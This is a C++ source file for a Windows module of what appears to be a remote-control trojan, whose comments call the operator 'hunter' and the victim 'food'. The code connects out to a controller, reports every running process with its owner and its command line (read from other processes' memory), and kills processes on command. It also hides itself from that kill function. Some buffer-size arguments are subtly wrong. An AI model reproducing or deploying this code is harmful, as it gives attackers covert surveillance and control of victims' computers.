#include "pch.h"
#include "Proc.h"

// 为了获取PEB结构
typedef struct
{
	DWORD Filler[4];
	DWORD InfoBlockAddress;
} __PEB;

typedef struct
{
	DWORD Filler[17];
	DWORD wszCmdLineAddress;
} __INFOBLOCK;

// 获取未显式导出的NtQueryInformationProcess函数 在winternl.h中被声明
// 主要是为了获取PEB结构 从而得到指定进程的命令行信息
typedef NTSTATUS(CALLBACK* PFN_NTQUERYINFORMATIONPROCESS)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength OPTIONAL
	);

static Proc gProc;

Proc::Proc() {

	// hunter发送至食物
	CmdFreshProcs = "FRESH_PROCS";
	CmdKillProc = "KILL_PROC";
	// 食物发送至hunter
	CmdSendProc = "SEND_PROC";
	CmdKillProcSuccess = "KILL_SUCCESS";
	CmdKillProcFailed = "KILL_FAILED";
	// 分割与结束符
	CmdSplit = ";";
	CmdEnd = "\r\n";
}

void Proc::startByNewThread(std::string domain, int port)
{
	// 将域名和端口合并为一个char*
	// 这里new出来的空间在fileThreadProc中delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// 传入刚出炉的char*参数
	HANDLE h = CreateThread(NULL, 0, Proc::procThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Proc::procThreadProc(LPVOID args)
{
	// 获取传入的域名和端口信息
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startProc(domain, port);
	// 不忘记delete
	delete [] (char*)args;
	return true;
}

void Proc::startProc(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for proc\r\n");
	}

	OutputDebugStringA("Started proc\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// 无数据会引起阻塞 防止占用cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// 将收到的数据加入到buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished Proc\r\n");
}


void Proc::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// 分割每条命令和参数并执行
	int endIndex;
	while ((endIndex = buf.find(gProc.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gProc.CmdEnd.length());

		int firstSplit = line.find(gProc.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gProc.CmdSplit.length());
		// 执行本命令
		processCmd(sock, cmd, line);
	}
}

// 解析出参数 返回映射 和食物主线程里的解析是一样的道理
std::map<std::string, std::string> Proc::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gProc.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gProc.CmdSplit.size();
		pos2 = data.find(gProc.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gProc.CmdFreshProcs) {
		doFreshProcs(sock);
		return;
	}

	if (cmd == gProc.CmdKillProc) {
		doKillProc(sock, args);
		return;
	}
}

void Proc::doFreshProcs(TcpSocket* sock) {

	std::string data; // 返回数据

	// 创建ctoolhelp对象来遍历进程快照
	CToolhelp thProcesses(TH32CS_SNAPPROCESS);
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk = thProcesses.ProcessFirst(&pe);
	for (; fOk; fOk = thProcesses.ProcessNext(&pe)) {

		// 排除本进程 防止被hunter误删
		if (pe.th32ProcessID == GetCurrentProcessId()) {
			continue;
		}

		// 拿到pid
		CHAR szPid[8];
		_itoa_s((int)pe.th32ProcessID, szPid, sizeof(szPid), 10);
		// 获取进程所有者
		// 显示进程所有者
		TCHAR szOwner[MAX_PATH + 1];
		if (!GetProcessOwner(pe.th32ProcessID, szOwner, MAX_PATH)) {
			StringCchPrintf(szOwner, sizeof(szOwner), "Cannot get");
		}

		//拿到命令行信息
		TCHAR szCmdLine[1024];
		if (!GetProcessCmdLine(pe.th32ProcessID, szCmdLine, _countof(szCmdLine))) {
			StringCchPrintf(szCmdLine, sizeof(szOwner), "Cannot get");
		}

		// 拼接返回信息
		data.clear();
		data.append(gProc.CmdSendProc + gProc.CmdSplit);
		data.append("EXENAME" + gProc.CmdSplit);
		data.append(pe.szExeFile + gProc.CmdSplit);
		data.append("PID" + gProc.CmdSplit);
		data.append(szPid + gProc.CmdSplit);
		data.append("OWNER" + gProc.CmdSplit);
		data.append(szOwner + gProc.CmdSplit);
		data.append("COMMAND" + gProc.CmdSplit);
		data.append(szCmdLine + gProc.CmdEnd);
		// 发送
		sock->sendData(data.data(), data.size());
	}

}

void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {

	std::string data; // 返回信息
	DWORD dwPid = atoi(args["PID"].data());
	// 开始kill进程
	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
	do
	{
		if (hProc == NULL) {
			OutputDebugStringA("open process failed\r\n");
			break;
		}
		if (TerminateProcess(hProc, 0) == 0) {
			OutputDebugStringA("terminate process failed\r\n");
			break;
		}

		OutputDebugStringA("kill process successfully\r\n");
		data.append(gProc.CmdKillProcSuccess + gProc.CmdEnd);
		sock->sendData(data.data(), data.size());
		return;

	} while (false);

	data.append(gProc.CmdKillProcFailed + gProc.CmdEnd);
	sock->sendData(data.data(), data.size());
	return;
}

BOOL Proc::GetProcessOwner(HANDLE hProcess, LPTSTR szOwner, size_t cchSize) {

	// 参数检查
	if ((szOwner == nullptr) || (cchSize == 0))
		return(FALSE);

	// 设置默认值
	StringCchPrintf(szOwner, cchSize, "Unknown");

	// 拿到进程令牌句柄
	HANDLE hToken = nullptr;
	// 提升到一个比较高的权限（成为操作系统的一部分 以操作系统方式操作）
	CToolhelp::EnablePrivilege(SE_TCB_NAME, TRUE);
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		CToolhelp::EnablePrivilege(SE_TCB_NAME, FALSE);
		return(FALSE);
	}

	// 获取TOKEN_USER结构大小
	DWORD cbti = 0;
	GetTokenInformation(hToken, TokenUser, nullptr, 0, &cbti);

	// 这里我改为do-while形式 逻辑好理解一些
	do {
		// 由于刚才只是请求大小 所以返回这个错误值才是正常的
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			break;
		// 申请堆空间来存放结构体
		PTOKEN_USER ptiUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, cbti);
		if (ptiUser == nullptr)
			break;

		// 拿到指定token的tokenuser信息
		if (GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti)) {
			SID_NAME_USE   snu;
			TCHAR          szUser[MAX_PATH];
			DWORD          chUser = MAX_PATH;
			PDWORD         pcchUser = &chUser;
			TCHAR          szDomain[MAX_PATH];
			DWORD          chDomain = MAX_PATH;
			PDWORD         pcchDomain = &chDomain;

			// 通过用户SID获取用户名和所在域名
			if (LookupAccountSid(
				nullptr,
				ptiUser->User.Sid,
				szUser,
				pcchUser,
				szDomain,
				pcchDomain,
				&snu)) {
				// 构造\\DomainName\UserName形式的字符串
				_tcscpy_s(szOwner, cchSize, TEXT("\\\\"));
				_tcscat_s(szOwner, cchSize, szDomain);
				_tcscat_s(szOwner, cchSize, TEXT("\\"));
				_tcscat_s(szOwner, cchSize, szUser);
			}
		}

		// 释放内存
		HeapFree(GetProcessHeap(), 0, ptiUser);

	} while (FALSE);

	// 释放句柄
	CloseHandle(hToken);

	// 重置权限设置
	CToolhelp::EnablePrivilege(SE_TCB_NAME, FALSE);

	return(TRUE);
}

// 通过进程pid获取进程所有者
BOOL Proc::GetProcessOwner(DWORD PID, LPTSTR szOwner, DWORD cchSize) {

	// 参数检查
	if ((PID <= 0) || (szOwner == nullptr))
		return(FALSE);

	// 打开进程句柄
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
	if (hProcess == nullptr)
		return(FALSE);

	// 还是调用上面那个函数
	BOOL bReturn = GetProcessOwner(hProcess, szOwner, cchSize);

	// 释放句柄
	CloseHandle(hProcess);

	return(bReturn);
}


BOOL Proc::GetProcessCmdLine(HANDLE hProcess, LPTSTR szCmdLine, DWORD Size) {



	// 参数检查
	if ((hProcess == nullptr) || (szCmdLine == nullptr) || (Size == 0))
		return(FALSE);

	// 0. 首先要获得进程的PEB地址
	DWORD dwSize;
	SIZE_T size;
	PROCESS_BASIC_INFORMATION  pbi;
	// 尽管PEB结构在xp系统中始终是在进程虚拟地址空间中的0x7ffdf000位置
	// 但是PEB的地址在每一版本Windows中是有区别的
	// 这个才是拿到PEB的正确方法
	// 先通过NtQueryInformationProcess函数拿到PROCESS_BASIC_INFORMATION结构
	// NtQueryInformationProcess函数失败时会返回负数
	if (0 > _NtQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		&dwSize)) {
		return FALSE;
	}

	// 1. 通过pbi提供的PEB地址找到进程环境快
	__PEB PEB;
	size = dwSize;
	if (!ReadProcessMemory(
		hProcess,
		pbi.PebBaseAddress,
		&PEB,
		sizeof(PEB),
		&size)) {
		return(FALSE);
	}

	// 2. 从PEB结构中获取指向包含进程命令行信息的结构的指针
	__INFOBLOCK Block;
	if (!ReadProcessMemory(
		hProcess,
		(LPVOID)PEB.InfoBlockAddress,
		&Block,
		sizeof(Block),
		&size)) {
		return(FALSE);
	}

	// 3. 获取命令行信息 注意 是用Unicode去接的
	wchar_t wszCmdLine[MAX_PATH + 1];
	if (!ReadProcessMemory(
		hProcess,
		(LPVOID)Block.wszCmdLineAddress,
		wszCmdLine,
		MAX_PATH * sizeof(wchar_t),
		&size)) {
		return(FALSE);
	}

	//    文件路径有可能是这两种形式"c:\...\app.exe" 或 c:\...\app.exe
	wchar_t* pPos = wszCmdLine; // 拿到第一个宽字符位置

	// 将已经跳过文件路径的命令行信息复制回去
	if (pPos != nullptr && *pPos != L'\0') {

		WideCharToMultiByte(CP_OEMCP, 0, wszCmdLine, _countof(wszCmdLine), szCmdLine, sizeof(szCmdLine), NULL, FALSE);
	}
	else {
		// 设置默认值
		StringCchPrintf(szCmdLine, Size, "Unknown");
	}
	// 所有都没问题 返回true
	return(TRUE);
}

// 通过pid获取指定进程命令行信息
BOOL Proc::GetProcessCmdLine(DWORD PID, LPTSTR szCmdLine, DWORD Size) {

	// 参数检查
	if ((PID <= 0) || (szCmdLine == nullptr))
		return(FALSE);

	// 打开指定进程对象 看是否有权限查看
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);
	if (hProcess == nullptr)
		return(FALSE);
	// 老套路 执行上面版本的函数
	BOOL bReturn = GetProcessCmdLine(hProcess, szCmdLine, Size);

	// 释放句柄
	CloseHandle(hProcess);

	return(bReturn);
}


// 封装了显式导入的NtQueryInformationProcess
NTSTATUS Proc::_NtQueryInformationProcess(
	HANDLE hProcess,
	PROCESSINFOCLASS pic,
	PVOID pPI,
	ULONG cbSize,
	PULONG pLength
) {

	HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
	if (hNtDll == nullptr) {
		return(-1);
	}

	NTSTATUS lStatus = -1;  // 默认返回-1

	// 拿到NtQueryInformationProcess函数本尊
	// 注意：dll中的函数名都是char
	PFN_NTQUERYINFORMATIONPROCESS pfnNtQIP =
		(PFN_NTQUERYINFORMATIONPROCESS)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (pfnNtQIP != nullptr) {
		lStatus = pfnNtQIP(hProcess, pic, pPI, cbSize, pLength);
	}
	// 释放动态库
	FreeLibrary(hNtDll);
	return(lStatus); // 返回NTSTATUS结构
}
